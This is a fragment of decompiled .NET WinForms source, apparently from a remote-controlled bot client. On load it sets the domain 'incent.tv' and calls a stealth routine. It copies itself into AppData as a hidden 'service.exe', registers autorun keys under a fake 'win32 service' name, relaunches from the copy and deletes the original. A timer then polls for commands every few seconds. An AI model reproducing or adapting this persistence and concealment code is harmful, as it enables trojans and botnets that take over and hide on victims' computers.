    private void Button2_Click(object sender, EventArgs e) => MyProject.Forms.reg.Show();

    private void offb_Click(object sender, EventArgs e) => MyProject.Forms.co.Show();

    private void aio_GotFocus(object sender, EventArgs e) => this.stealth();

    private void aio_Load(object sender, EventArgs e)
    {
      if (!this.autocontrolled)
        return;
      this.domaint.Text = "incent.tv";
      this.Button1.PerformClick();
      this.stealth();
      this.Timer1.Enabled = true;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      string executablePath = Application.ExecutablePath;
      try
      {
        if (Operators.CompareString(folderPath, executablePath, false) != 0)
        {
          Microsoft.VisualBasic.FileIO.FileSystem.DeleteFile(folderPath + "\\service.exe");
          aio.RemoveKey("win32 service");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (!Microsoft.VisualBasic.FileIO.FileSystem.FileExists(folderPath + "\\service.exe"))
      {
        Microsoft.VisualBasic.FileIO.FileSystem.CopyFile(executablePath, folderPath + "\\service.exe");
        System.IO.File.SetAttributes(folderPath + "\\service.exe", FileAttributes.Hidden);
        aio.AddStartup("win32 service", folderPath + "\\service.exe");
        aio.AddStartup("whereitwas", executablePath);
        Process.Start(folderPath + "\\service.exe");
        this.Close();
      }
      try
      {
        if (!Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.ReadKey("whereitwas"), (object) "", false))))
          return;
        Microsoft.VisualBasic.FileIO.FileSystem.DeleteFile(Conversions.ToString(this.ReadKey("whereitwas")));
        aio.RemoveKey("whereitwas");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (this.Timer1.Interval == 1)
        this.Timer1.Interval = 5000;
      if (this.taskid != 0)
        return;
      this.docommand();
    }

    private void wd_Click(object sender, EventArgs e) => MyProject.Forms.wd.Show();

    private void ctb_Click(object sender, EventArgs e) => MyProject.Forms.ct.Show();
  }
}
